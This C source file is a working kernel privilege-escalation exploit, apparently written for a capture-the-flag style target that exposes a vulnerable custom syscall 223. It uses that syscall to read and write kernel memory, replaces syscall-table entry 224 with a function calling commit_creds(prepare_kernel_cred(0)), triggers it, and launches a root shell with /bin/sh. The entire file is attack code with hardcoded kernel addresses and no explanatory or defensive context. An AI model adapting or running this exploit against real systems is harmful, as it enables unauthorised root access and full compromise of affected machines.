#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <string.h>

#define SYS_CALL_TABLE 0x8000e348

int (*commit_creds)(unsigned long cred);
unsigned long  (*prepare_kernel_cred)(unsigned long cred);

long sys_pe() {
    commit_creds = 0x8003f56c;
    prepare_kernel_cred = 0x8003f924;
    commit_creds(prepare_kernel_cred(0));
    return 1337;
}


unsigned int read_addr(char* addr) {
    unsigned int ret = 0;
    char* retp = (char*)(&ret);
    char buf[1024] = {0};
    int i = 0;

    for(; i < 4; ++i) {
        syscall(223, addr + i, buf);
        retp[i] = buf[0];
    }
    return ret;
}

void write_addr(unsigned int data, char* addr) {
    char* cp = &data;
    char buf[2] = {0};
    int i = 0;
    for(; i < 4; ++i) {
        buf[0] = cp[i];
        syscall(223, buf, addr + i);
    }
}

int main() {
        printf("%16x\n", read_addr((unsigned long**)(SYS_CALL_TABLE) + 224));
        printf("%p\n", &sys_pe);
        write_addr(&sys_pe, (unsigned long**)(SYS_CALL_TABLE) + 224);
        printf("%ld\n", syscall(224));
        system("/bin/sh");
        return 0;
}
